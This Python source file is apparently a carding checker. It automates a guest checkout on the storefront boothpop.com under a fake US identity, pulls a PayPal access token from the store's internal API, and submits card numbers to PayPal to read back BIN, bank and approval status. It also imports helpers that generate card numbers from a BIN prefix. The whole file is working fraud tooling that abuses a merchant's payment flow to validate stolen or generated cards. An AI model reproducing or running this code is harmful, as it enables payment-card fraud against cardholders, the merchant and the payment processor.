
from app.core.reqPlus import reqPlus

from app.utils.exceptions import(
    expInvalidRequest,
    expInvalidRequestsResponse,
    invalidCredentials,
    userNotFound,
    captchaWrong,
    expMaxRetries,
    expSpecialTimeOut
)

import urllib

from app.utils.cchelper import(
    formatar_cc,
    fmt_cc,
    luhn,
    gen_gg
)

from app.utils.utils import(
    add_arquivo,
    gibe_random_ua,
    b64decfixpad
)


import json

from app.utils.fakeUSAperson import FakePesonCheckoutAluvii


class boooothPOP(reqPlus):
    def __init__(
        self,
        proxies={},
        timeout=(10,30)
    ):
        self.client_data = None
        self.client_mail = 'juliettedrunk@fthcapital.com'
        super().__init__(proxies=proxies, timeout=timeout, default_useragent=gibe_random_ua())
    def gen_client(self):
        fake = FakePesonCheckoutAluvii()
        self.client_data = fake
    def find_initial_headerXcookie(self, response):
        looking = ['xsrf-token', 'sf-csrf-token']
        found = {}
        try:
            for cookie in response.response.cookies:
                for look in looking:
                    if cookie.name.lower() == look.lower():
                        found.update(
                            {
                                look: cookie.value
                            }
                        )
                        break
        except Exception as err:
            print(f'boooothPOP.find_initial_headerXcookie exp --- {err}')
        else:
            return found
        return False
    def initiate_session(self):
        self.new_session(ua=gibe_random_ua())
        self.gen_client()
        url = f'https://www.boothpop.com/flags-event-tents/accessories/advertising-flags-water-bag-for-cross-base/'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/',
            origin='https://www.boothpop.com'
        )
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                method='GET'
            )
        except Exception as err:
            print(f'initiate_session exp --- {err}')
        else:
            if response.status_code == 200:
                token_headers = self.find_initial_headerXcookie(response=response)
                if token_headers:
                    if len(list(token_headers.keys())) == 2:
                        response.set_status(True)
                        response.add_extra(
                            {
                                'xsrf': token_headers
                            }
                        )
                        return True
                    else:
                        print(f'boooothPOP.initiate_session len token headers != 2')
                else:
                    print(f'boooothPOP.initiate_session no token headers')
            else:
                print(f'boooothPOP.initiate_session.response status_code != 200 -- {response.status_code}')
        return False
    def add_item(self):
        response_initiate_session = self.get_request('initiate_session', True)
        if not response_initiate_session:
            return False
        tokens = response_initiate_session.get_extra().get('xsrf', {})
        xsrf = tokens.get('xsrf-token')
        csrf = tokens.get('sf-csrf-token')
        if not xsrf or not csrf:
            return False
        token_free = {
            'x-xsrf-token': xsrf,
            'x-sf-csrf-token': csrf,
        }
        url = 'https://www.boothpop.com/remote/v1/cart/add'
        headers = self.gen_headers(
            referer=response_initiate_session.response.url,
            origin='https://www.boothpop.com',
            **token_free
        )
        payload = {
            'action': (None, 'add'),
            'product_id': (None, '314'),
            'qty[]': (None, '1'),
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                files=payload,
                method='POST'
            )
        except Exception as err:
            print(f'add_item exp --- {err}')
        else:
            if response.status_code == 200:
                response_data = response.json().get('data', {})
                cart_id = response_data.get('cart_id', False)
                cart_item = response_data.get('cart_item', {}).get('id', False)
                if cart_id and cart_item:
                    response.set_status(True)
                    response.add_extra(
                        {
                            'cart_id': cart_id,
                            'cart_item': cart_item,
                            'xsrf': token_free
                        }
                    )
                    return True
                else:
                    print(f'boooothPOP.add_item cart_id == False /// no ID cart_item')
            else:
                print(f'boooothPOP.add_item.response status_code != 200 -- {response.status_code}')
        return False
    def set_client(self):
        response_add_item = self.get_request('add_item', True)
        if not response_add_item:
            return False
        extra_data = response_add_item.get_extra()
        cart_id = extra_data.get('cart_id', False)
        token_free = extra_data.get('xsrf', False)
        if not cart_id or not token_free:
            return False
        url = f'https://www.boothpop.com/api/storefront/checkouts/{cart_id}/billing-address?include=cart.lineItems.physicalItems.options,cart.lineItems.digitalItems.options,customer,promotions.banners'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/checkout',
            origin='https://www.boothpop.com',
            **token_free
        )
        payload = {
            'email': self.client_mail,
            'acceptsMarketingNewsletter': False,
            'acceptsAbandonedCartEmails': False,
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='POST'
            )
        except Exception as err:
            print(f'set_client exp --- {err}')
        else:
            if response.status_code == 200:
                if self.client_mail in response.text():
                    response.set_status(True)
                    response.add_extra(extra_data)
                    return True
                else:
                    print(f'boooothPOP.set_client couldnt find {self.client_mail} in responsetext')
            else:
                print(f'boooothPOP.set_client status_code != 200 -- {response.status_code}')
        return False
    def freight_options(self):
        response_set_client = self.get_request('set_client', True)
        if not response_set_client:
            return False
        extra_data = response_set_client.get_extra()
        cart_id = extra_data.get('cart_id', False)
        cart_item = extra_data.get('cart_item', False)
        token_free = extra_data.get('xsrf', False)
        if not cart_item or not cart_id or not token_free:
            return False
        url = f'https://www.boothpop.com/api/storefront/checkouts/{cart_id}/consignments?include=consignments.availableShippingOptions,cart.lineItems.physicalItems.options,cart.lineItems.digitalItems.options,customer,promotions.banners,0'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/checkout',
            origin='https://www.boothpop.com',
            **token_free
        )
        payload = [
            {
                "address": {
                    "countryCode": "US",
                    "firstName": self.client_data.first_name,
                    "lastName": self.client_data.last_name,
                    "address1": self.client_data.street,
                    "address2": "",
                    "company": "",
                    "city": self.client_data.city,
                    "stateOrProvince": "",
                    "postalCode": self.client_data.zipcode,
                    "phone": self.client_data.phone,
                    "shouldSaveAddress": True,
                    "stateOrProvinceCode": self.client_data.state_abbr,
                    "customFields": []
                },
                "lineItems": [
                    {
                        "itemId": cart_item,
                        "quantity": 1
                    }
                ]
            }
        ]
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='POST'
            )
        except Exception as err:
            print(f'freight_options exp --- {err}')
        else:
            if response.status_code == 200:
                freight_options = response.json().get('consignments', [])
                if freight_options:
                    freight_set = freight_options[0]
                    freight_id = freight_set.get('id', False)
                    freight_select = freight_set.get('availableShippingOptions', [])
                    if freight_select and freight_id:
                        freight_select = freight_select[0].get('id', False)
                        extra_data.update(
                            {
                                'freight_id': freight_id,
                                'freight_select': freight_select
                            }
                        )
                        response.set_status(True)
                        response.add_extra(extra_data)
                        return True
                    else:
                        print(f'boooothPOP.freight_options didnt find ID consignments')
                else:
                    print(f'boooothPOP.freight_options couldnt find freight options')
            else:
                print(f'boooothPOP.freight_options status_code != 200 -- {response.status_code}')
        return False
    def set_freight(self):
        response_freight_options = self.get_request('freight_options', True)
        if not response_freight_options:
            return False
        extra_data = response_freight_options.get_extra()
        cart_id = extra_data.get('cart_id', False)
        cart_item = extra_data.get('cart_item', False)
        freight_id = extra_data.get('freight_id', False)
        freight_select = extra_data.get('freight_select', False)
        token_free = extra_data.get('xsrf', False)
        if not cart_item or not cart_id or not token_free or not freight_id or not freight_select:
            return False
        url = f'https://www.boothpop.com/api/storefront/checkouts/{cart_id}/consignments/{freight_id}?include=consignments.availableShippingOptions,cart.lineItems.physicalItems.options,cart.lineItems.digitalItems.options,customer,promotions.banners'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/checkout',
            origin='https://www.boothpop.com',
            **token_free
        )
        payload = {
            'shippingOptionId': freight_select
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='PUT'
            )
        except Exception as err:
            print(f'set_freight exp --- {err}')
        else:
            if response.status_code == 200:
                address_id = response.json().get('billingAddress', {}).get('id', False)
                if address_id:
                    extra_data.update(
                        {
                            'address_id': address_id
                        }
                    )
                    response.set_status(True)
                    response.add_extra(extra_data)
                    return True
                else:
                    print(f'boooothPOP.set_freight couldnt find address_id')
            else:
                print(f'boooothPOP.set_freight status_code != 200 -- {response.status_code}')
        return False
    def set_order(self):
        response_set_freight = self.get_request('set_freight', True)
        if not response_set_freight:
            return False
        extra_data = response_set_freight.get_extra()
        cart_id = extra_data.get('cart_id', False)
        cart_item = extra_data.get('cart_item', False)
        freight_id = extra_data.get('freight_id', False)
        freight_select = extra_data.get('freight_select', False)
        address_id = extra_data.get('address_id', False)
        token_free = extra_data.get('xsrf', False)
        if not cart_item or not cart_id or not token_free or not freight_id or not freight_select or not address_id:
            return False
        url = f'https://www.boothpop.com/api/storefront/checkouts/{cart_id}/billing-address/{address_id}?include=cart.lineItems.physicalItems.options,cart.lineItems.digitalItems.options,customer,promotions.banners'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/checkout',
            origin='https://www.boothpop.com',
            **token_free
        )
        payload = {
            "countryCode": "US",
            "firstName": self.client_data.first_name,
            "lastName": self.client_data.last_name,
            "address1": self.client_data.street,
            "address2": "",
            "company": "",
            "city": self.client_data.city,
            "stateOrProvince": "",
            "postalCode": self.client_data.zipcode,
            "phone": self.client_data.phone,
            "shouldSaveAddress": True,
            "stateOrProvinceCode": self.client_data.state_abbr,
            "customFields": [],
            "email": self.client_mail
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='PUT'
            )
        except Exception as err:
            print(f'set_order exp --- {err}')
        else:
            if response.status_code == 200:
                if self.client_mail in response.text():
                    response.set_status(True)
                    response.add_extra(extra_data)
                    return True
                else:
                    print(f'boooothPOP.set_order couldnt find {self.client_mail} in responsetext')
            else:
                print(f'boooothPOP.set_order status_code != 200 -- {response.status_code}')
        return False
    def p1(self):
        response_set_order = self.get_request('set_order', True)
        if not response_set_order:
            return False
        extra_data = response_set_order.get_extra()
        cart_id = extra_data.get('cart_id', False)
        cart_item = extra_data.get('cart_item', False)
        freight_id = extra_data.get('freight_id', False)
        freight_select = extra_data.get('freight_select', False)
        token_free = extra_data.get('xsrf', False)
        if not cart_item or not cart_id or not token_free or not freight_id or not freight_select:
            return False
        token_free.update(
            {
                'X-API-INTERNAL': 'This API endpoint is for internal use only and may change in the future'
            }
        )
        url = f'https://www.boothpop.com/api/storefront/payments/paypalcommercecreditcards?cartId={cart_id}'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/checkout',
            origin='https://www.boothpop.com',
            **token_free
        )
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                method='GET'
            )
        except Exception as err:
            print(f'p1a exp --- {err}')
        else:
            if response.status_code == 200:
                token_paypal = response.json().get('clientToken', False)
                if token_paypal:
                    token_paypal_dec = b64decfixpad(token_paypal)
                    if token_paypal_dec:
                        try:
                            token_paypal_use = json.loads(token_paypal_dec).get('paypal', {}).get('accessToken', False)
                        except Exception as err1:
                            print(f'p1a exp2 --- {err1}')
                        else:
                            if token_paypal_use:
                                extra_data.update(
                                    {
                                        'paypal_token': token_paypal_use
                                    }
                                )
                                response.set_status(True)
                                response.add_extra(extra_data)
                                return True
                            else:
                                print(f'sem token paypal')
                    else:
                        print(f'token_paypal_dec falhou')
                else:
                    print(f'sem token_paypal')
            else:
                print(f'p1a status_code != 200 --- {response.status_code}')
        return False
    def p2(self):
        response_p1 = self.get_request('p1', True)
        if not response_p1:
            return False
        extra_data = response_p1.get_extra()
        cart_id = extra_data.get('cart_id', False)
        cart_item = extra_data.get('cart_item', False)
        freight_id = extra_data.get('freight_id', False)
        freight_select = extra_data.get('freight_select', False)
        paypal_token = extra_data.get('paypal_token', False)
        token_free = extra_data.get('xsrf', False)
        if not cart_item or not cart_id or not token_free or not freight_id or not freight_select or not paypal_token:
            return False
        token_free.update(
            {
                'X-API-INTERNAL': 'This API endpoint is for internal use only and may change in the future'
            }
        )
        url = 'https://www.boothpop.com/api/storefront/payment/paypalcommercecreditcardscheckout'
        headers = self.gen_headers(
            referer='https://www.boothpop.com/checkout',
            origin='https://www.boothpop.com',
            **token_free
        )
        payload = {
            'cartId': cart_id,
            'shouldSaveInstrument': False
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='POST'
            )
        except Exception as err:
            print(f'p2 exp --- {err}')
        else:
            if response.status_code == 200:
                order_id = response.json().get('orderId', False)
                next_url = response.json().get('approveUrl', False)
                if order_id and next_url:
                    extra_data.update(
                        {
                            'order_id': order_id,
                            'next_url': next_url
                        }
                    )
                    response.set_status(True)
                    response.add_extra(extra_data)
                    return True
                else:
                    print(f'boooothPOP.p2 couldnt find {self.client_mail} in responsetext')
            else:
                print(f'boooothPOP.p2 status_code != 200 -- {response.status_code}')
        return False
    def retrieve_bin_data(self, cc_raw):
        response_p2 = self.get_request('p2', True)
        if not response_p2:
            return False
        extra_data = response_p2.get_extra()
        cart_id = extra_data.get('cart_id', False)
        cart_item = extra_data.get('cart_item', False)
        freight_id = extra_data.get('freight_id', False)
        order_id = extra_data.get('order_id', False)
        paypal_token = extra_data.get('paypal_token', False)
        token_free = extra_data.get('xsrf', False)
        cc_data = formatar_cc(cc_raw)
        if not cart_item or not cart_id or not token_free or not freight_id or not order_id or not cc_data or not paypal_token:
            return False
        url = f'https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source'
        headers = self.gen_headers(
            referer='https://www.paypal.com/',
            origin='https://www.paypal.com',
            bearer=paypal_token,
            **{
                'Content-Type': 'application/json'
            }
        )
        payload = {
            "payment_source": {
                "card": {
                    "number": cc_data.get('cc'),
                    "security_code": cc_data.get('cvv'),
                    "expiry": f'20{cc_data.get("year")}-{cc_data.get("month")}',
                    "billing_address": {
                        "company": "",
                        "address_line_1": self.client_data.street,
                        "address_line_2": "",
                        "admin_area_1": self.client_data.state_abbr,
                        "admin_area_2": self.client_data.city,
                        "postal_code": self.client_data.zipcode,
                        "country_code": "US"
                    },
                    "name": self.client_data.full_name
                }
            }
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='POST'
            )
        except Exception as err:
            print(f'retrieve_bin_data exp --- {err}')
        else:
            if response.status_code == 200:
                #if response.json().get('status', '') == 'APPROVED':
                if 1==1:
                    temp_cc_data = response.json().get('payment_source', {}).get("card", {})
                    if temp_cc_data:
                        card_brand = temp_cc_data.get('brand', None)
                        card_networks = str(temp_cc_data.get('available_networks', []))
                        card_type = temp_cc_data.get('type', None)
                        card_bin = temp_cc_data.get('bin_details', {}).get('bin', None)
                        card_country = temp_cc_data.get('bin_details', {}).get('bin_country_code', None)
                        card_bank = temp_cc_data.get('bin_details', {}).get('issuing_bank', None)
                        product_types = str(temp_cc_data.get('bin_details', {}).get('products', []))
                        response.add_extra(
                            {
                                'card_bin': card_bin,
                                'card_brand': card_brand,
                                'card_type': card_type,
                                'card_country': card_country,
                                'card_bank': card_bank,
                                'card_networks': card_networks,
                                'product_types': product_types,
                                'status': response.json().get('status', '')
                            }
                        )
                        response.set_status(True)
                        return True
                    else:
                        print(f'boothpop.retrieve_bin_data -- failed find payment_source.card')
                else:
                    print(f'boooothPOP.retrieve_bin_data status != APPROVED')
            else:
                print(f'boooothPOP.retrieve_bin_data status_code != 200 -- {response.status_code}')
        return False
    def check_bin(self, cc):
        if not self.get_request('initiate_session', True):
            if not self.initiate_session():
                print(f'initiate_session failed')
                return False
        if not self.get_request('add_item', True):
            if not self.add_item():
                print(f'add_item failed')
                return False
        if not self.get_request('set_client', True):
            if not self.set_client():
                print(f'set_client failed')
                return False
        if not self.get_request('freight_options', True):
            if not self.freight_options():
                print(f'freight_options failed')
                return False
        if not self.get_request('set_freight', True):
            if not self.set_freight():
                print(f'set_freight failed')
                return False
        if not self.get_request('set_order', True):
            if not self.set_order():
                print(f'set_order failed')
                return False
        if not self.get_request('p1', True):
            if not self.p1():
                print(f'p1 failed')
                return False
        if not self.get_request('p2', True):
            if not self.p2():
                print(f'p2 failed')
                return False
        temp_cc = formatar_cc(cc)
        if not temp_cc:
            if len(cc) >= 6:
                cc = gen_gg(base=cc, qtd=1)
        if not formatar_cc(cc):
            print(f'falhou formatar CC -- {cc}')
            return False
        if self.retrieve_bin_data(cc):
            return self.get_request('retrieve_bin_data')
        return False





        




